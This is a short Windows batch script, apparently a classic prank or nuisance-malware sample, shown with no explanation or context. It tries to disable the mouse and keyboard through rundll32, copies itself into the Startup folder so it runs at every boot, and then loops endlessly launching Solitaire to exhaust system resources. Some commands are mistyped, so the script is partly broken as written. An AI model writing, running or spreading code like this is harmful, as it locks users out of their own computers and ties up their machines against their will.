   @echo off
   c:\windows\rundll32\mouse,disable
   c:\windows\rundll\32\keyboard,disable
   copy%0 c:\windows\startm~1\programs\startup

   goto loop

   :loop
   start sol.exe

   goto loop
